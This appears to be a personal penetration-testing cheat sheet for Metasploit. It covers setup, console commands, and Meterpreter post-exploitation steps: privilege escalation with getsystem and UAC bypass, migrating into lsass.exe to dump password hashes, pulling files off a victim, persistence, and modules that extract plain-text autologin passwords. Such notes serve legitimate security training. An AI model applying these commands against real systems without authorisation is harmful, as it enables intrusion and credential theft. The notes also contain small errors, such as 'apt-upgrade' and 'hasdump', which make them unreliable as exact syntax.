---
title: metasploit
author: amandaguglieri
draft: false
TableOfContents: true
tag: #pentesting  
---

# metasploit

## Run metasploit

```bash
# start the postgresql service
service postgresql start 

# Initiate database
sudo msfdb init 

# Launch metasploit from terminal. -q means without banner
msfconsole -q  
```

## Update metasploit 

How to update metasploit database, since msfupdate is deprecated.

```bash
# Update the whole system
apt update && apt-upgrade -y   

# Update libraries and dependencies
apt dist-upgrade

# Reinstall the app
apt install metasploit-framework 
```

## Basic commands

```msf
# Help information
show -h  
```

```
=========================

Database Backend Commands

=========================

db_connect        Connect to an existing data service

db_disconnect     Disconnect from the current data service

db_export         Export a file containing the contents of the database

db_import         Import a scan result file (filetype will be auto-detected)

db_nmap           Executes nmap and records the output automatically

db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)

db_remove         Remove the saved data service entry

db_save           Save the current data service connection as the default to reconnect on startup

db_status         Show the current data service status

hosts             List all hosts in the database

loot              List all loot in the database

notes             List all notes in the database

services          List all services in the database

vulns             List all vulnerabilities in the database

workspace         Switch between database workspaces
```
  

Cheat sheet: 

```msf

# Search modules
search (mysearchitem> 

# Search for exploit of service hfs 2.3 serve
searchsploit hfs 2.3

# Use a module 
use <name of module (like exploit/cmd/linux/tcp_reverse) or number> 

# Show options of current module (Watch out, prompt is included)
msf exploit/cmd/linux/tcp_reverse> show options   

# Configure an option (Watch out, prompt is included)
msf exploit/cmd/linux/tcp_reverse> set <option> <value> 

# Configure an option as a constant during the msf session (Watch out, prompt is included)
msf exploit/cmd/linux/tcp_reverse> setg <option> <value> 

# Go back to the main msf prompt (Watch out, prompt is included)
msf exploit/cmd/linux/tcp_reverse> back 

# View related information of the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> info 

# View related payloads of the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> show payloads 

# Set a payload for the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> set payload <value> 

# Run the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> run  

# Run the exploit (Watch out, prompt is included)
msf  exploit/cmd/linux/tcp_reverse> exploit 

# See all sessions (Watch out, prompt is included)
msf> sessions

# Switch to session number n (Watch out, prompt is included)
msf> sessions -i <n>  
```
   

## Meterpreter

When having an active session on the victim machine, the best module to run a Meterpreter is s4u_persistence:

```msf
use exploit/windows/local/s4u_persistence

show options

sessions 
```




## meterpreter commands

```
# view all available commands
help 
  
# Obtain a shell. Exit to exit the shell
shell  

# View information about the system
sysinfo

# View the id that meterpreter assigns to the machine
machine_id

# Print the network configuration
ifconfig 

# check routing information
route   

# Download a file
download /path/to/fileofinterest.txt /path/to/ourmachine/destinationfile.txt

# Upload a file
upload /path/from/source.txt /path/to//destinationfile.txt

# Bypass the authentification. It takes you from normal user to admin
getsystem
# If the operation fails because of priv_elevated_getsystem error message, then use the  bypassuac module: use exploit/windows/local/bypassuac

# View who you are
getuid  

# View all running processes
ps

# View the process that we are
getpid

# Enumerate the modules available at this meterpreter session
use -l   

# load a specific module
use <name of module>  

# View all processes run by the system. This allows us to choose one in order to migrate the process of our persistent connection in order to have one less suspicious. 
ps -U SYSTEM  

# Change to a process
migrate  <pid>        
migrate -N lsass.exe
# -N   Look for the lsass.exe process and migrate the process into that. We can do this to run the command: hashdump (we’ll get hashes to use them with john the ripper or ophcrack). Also, we can choose a less suspicious process such as svhost.exe and migrate there
```
  
## metasploit modules

### windows/gather/arp-scanner

To enumerate IPs in a network interface


### post/windows/gather/hasdump 

Once you have a meterpreter session as system user, this module dumps all passwords.

### windows/gather/credentials/windows_autologin

This module extracts the plain-text Windows user login password in  Registry. It exploits a Windows feature that Windows (2000 to 2008 R2) allows a user or third-party Windows Utility tools to configure User AutoLogin via plain-text password insertion in (Alt)DefaultPassword field in the registry location -  HKLM\Software\Microsoft\Windows NT\WinLogon. This is readable by all  users.

### post/windows/gather/win_privs

This module tells you the privileges you have on the exploited machine. 


### exploit/windows/local/bypassuac

If getsystem command fails (in the meterpreter) because of a priv_elevated_getsystem error message, then use this module to bypass that restriction. You will get a new meterpreter session with the UAC policy disabled. Now you can run getsystem.use

### post/multi/manage/shell_to_meterpretersessions

It upgrades your shell to a meterpreter

### auxiliary/server/socks_proxy

This module provides a SOCKS proxy server that uses the builtin Metasploit routing to relay connections.
